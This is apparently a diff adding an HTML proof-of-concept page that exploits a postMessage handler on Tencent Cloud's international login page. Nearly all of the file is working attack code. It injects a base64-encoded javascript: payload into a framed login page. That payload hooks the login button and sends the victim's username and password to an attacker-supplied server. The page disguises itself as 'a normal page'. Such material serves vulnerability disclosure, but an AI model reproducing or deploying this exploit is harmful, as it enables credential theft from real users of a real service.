@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Creditnails Exfiltration PoC</title>
+    <script>
+      let ATTACKER_SERVER = new URLSearchParams(location.search).get(
+        "ATTACKER_SERVER"
+      );
+      let payload = btoa(`document.body.innerHTML +=
+  '<a href="https://intl.cloud.tencent.com/account/login/?sa-visual-mode=true" target="_blank" id="openerAnchor"></a>';
+
+var link = document.getElementById("openerAnchor");
+var win;
+link.onclick = function () {
+  win = window.open(link.href, "_blank");
+  return false;
+};
+
+link.click();
+
+win.onload = () => {
+    
+  win.eval(\`var interv = setInterval(() => {
+    var btn = document.getElementsByClassName(
+      "tea-btn Button_intl-account-button__6mD_p intl-account-actions-item"
+    )[0];
+    if (btn) {
+      clearInterval(interv);
+      btn.onclick = () => {
+        var userName = document.getElementsByName("username")[0].value;
+        var password = document.getElementsByName("password")[0].value;
+        fetch(
+          "${ATTACKER_SERVER}?victimUserName=" +
+            encodeURIComponent(userName) +
+            "&victimPassword=" +
+            encodeURIComponent(password)
+        );
+      };
+    }
+  }, 500);\`)
+};
+`);
+
+
+
+
+      let msg = {
+        source: "sa-fe",
+        type: "v-track-mode",
+        data: {
+          userURL: `javascript:eval(atob('${payload}'))//`,
+          isVtrack: 1,
+        },
+      };
+
+      setTimeout(function () {
+        iframe.contentWindow.postMessage(msg, "*");
+      }, 4000);
+    </script>
+  </head>
+  <body>
+    <h1>Hi this is a normal page !!!</h1>
+    <iframe
+      id="iframe"
+      src="https://intl.cloud.tencent.com/account/login/subAccount?sa-visual-mode=true"
+      name='{"sa-visual-mode":true}'
+    ></iframe>
+  </body>
+</html>
